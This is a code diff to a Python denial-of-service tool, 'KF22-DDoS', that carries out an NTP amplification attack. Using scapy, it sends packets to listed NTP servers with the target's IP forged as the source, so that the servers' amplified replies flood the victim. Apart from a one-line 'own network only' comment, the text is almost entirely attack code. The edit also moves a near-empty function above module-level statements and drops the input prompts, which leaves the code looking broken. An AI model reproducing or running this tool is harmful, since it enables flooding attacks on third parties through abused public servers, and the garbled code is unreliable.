@@ -6,7 +6,13 @@ import time
 #NTP Amp DOS attack
 #usage ntpdos.py <target ip> <ntpserver list> <number of threads> ex: ntpdos.py 1.2.3.4 file.txt 10
 #FOR USE ON YOUR OWN NETWORK ONLY
+#packet sender
 
+def deny():
+    global ntplist
+    global currentserver
+    global data
+    global target
 
 os.system("Clear")
 logo = """
@@ -27,14 +33,6 @@ _—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—
 faded_text = fade.fire(logo)
 print(faded_text)
 print("\033[32mWelcome to KF22-DDoS\033[0m")
-ip = input("\033[36mIP/Domain: \033[0m")
-port = int(input("\033[34mPort: \033[0m"))
-#packet sender
-def deny():
-    global ntplist
-    global currentserver
-    global data
-    global target
 ntpserver = ntplist[currentserver] #Get new server
 currentserver = currentserver + 1 #Increment for next
 packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) #BUILD IT
